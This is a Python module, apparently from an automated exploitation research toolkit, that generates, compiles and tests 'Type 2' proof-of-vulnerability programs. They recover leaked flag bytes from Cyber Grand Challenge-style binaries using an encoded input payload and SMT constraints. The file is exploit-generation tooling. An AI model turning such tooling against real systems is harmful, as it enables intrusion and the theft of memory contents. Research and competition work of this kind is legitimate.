import os
import tempfile
import compilerex
from .harvester import Harvester
from .c_templates import c_template
from rex.pov_testing import CGCPovTester

import logging

l = logging.getLogger("colorguard.pov")

class ColorguardType2Exploit(object):
    """
    A Type2 exploit created using the Colorgaurd approach.
    """

    def __init__(self, binary, input_string, harvester, smt_stmt, output_var):
        """
        :param binary: path to binary
        :param input_string: string which causes the leak when used as input to the binary
        :param harvester: AST harvester object
        :param smt_stmt: string SMT statement describing the constraint
        :param output_var: clarpiy output variable
        """
        self.binary = binary
        self.input_string = input_string
        self.harvester = harvester
        self.output_var = output_var
        self.method_name = 'circumstantial'


        leaked_bytes = harvester.get_largest_consecutive()
        assert len(leaked_bytes) >= 4, "input does not leak enough bytes, 4 bytes required"

        # set by generate_formula
        self._output_var_idx = None
        self._cgc_flag_data_idx = None

        self._smt_stmt = self._generate_formula(smt_stmt)

        self._output_size = harvester.ast.size() / 8

        self._flag_byte_1 = leaked_bytes[0]
        self._flag_byte_2 = leaked_bytes[1]
        self._flag_byte_3 = leaked_bytes[2]
        self._flag_byte_4 = leaked_bytes[3]

    def _generate_formula(self, formula):

        # clean up the smt statement
        new_form = ""
        output_var_idx = None
        for i, line in enumerate(formula.split("\n")[2:][:-2]):
            if "declare-fun" in line:
                if self.output_var.args[0] in line:
                    output_var_idx = i
            new_form += "\"%s\"\n" % (line + "\\n")

        assert output_var_idx is not None, "could not find output_var"
        assert output_var_idx in [0, 1], "output_var_idx has unexpected value"

        cgc_flag_data_idx = 1 - output_var_idx

        self._output_var_idx = 2 + output_var_idx
        self._cgc_flag_data_idx = 2 + cgc_flag_data_idx

        return new_form

    def dump_c(self, filename=None):
        """
        Creates a simple C file to do the Type 2 exploit
        :return: the C code
        """

        encoded_payload = ""
        for c in self.input_string:
            encoded_payload += "\\x%02x" % ord(c)

        fmt_args = dict()
        fmt_args["payload"] = encoded_payload
        fmt_args["payloadsize"] = hex(len(self.input_string))
        fmt_args["output_size"] = hex(self._output_size)
        fmt_args["smt_stmt"] = self._smt_stmt
        fmt_args["output_var_idx"] = hex(self._output_var_idx)
        fmt_args["cgc_flag_data_idx"] = hex(self._cgc_flag_data_idx)
        fmt_args["receive_code"] = '\n'.join(self.harvester.receives)
        fmt_args["flag_byte_1"] = hex(self._flag_byte_1)
        fmt_args["flag_byte_2"] = hex(self._flag_byte_2)
        fmt_args["flag_byte_3"] = hex(self._flag_byte_3)
        fmt_args["flag_byte_4"] = hex(self._flag_byte_4)

        c_code = c_template
        for k, v in fmt_args.items():
            c_code = c_code.replace("{%s}" % k, v)

        if filename is not None:
            with open(filename, 'w') as f:
                f.write(c_code)
        else:
            return c_code

    def dump_binary(self, filename=None):
        c_code = self.dump_c()
        compiled_result = compilerex.compile_from_string(c_code,
                                                         filename=filename)

        if filename:
            return None

        return compiled_result

    def test_binary(self, enable_randomness=True):
        '''
        Test the binary generated
        '''

        # dump the binary code
        pov_binary_filename = tempfile.mktemp(dir='/tmp', prefix='colorguard-pov-')
        self.dump_binary(filename=pov_binary_filename)

        pov_tester = CGCPovTester()
        result = pov_tester.test_binary_pov(pov_binary_filename, self.binary, enable_randomness)

        os.remove(pov_binary_filename)

        return result
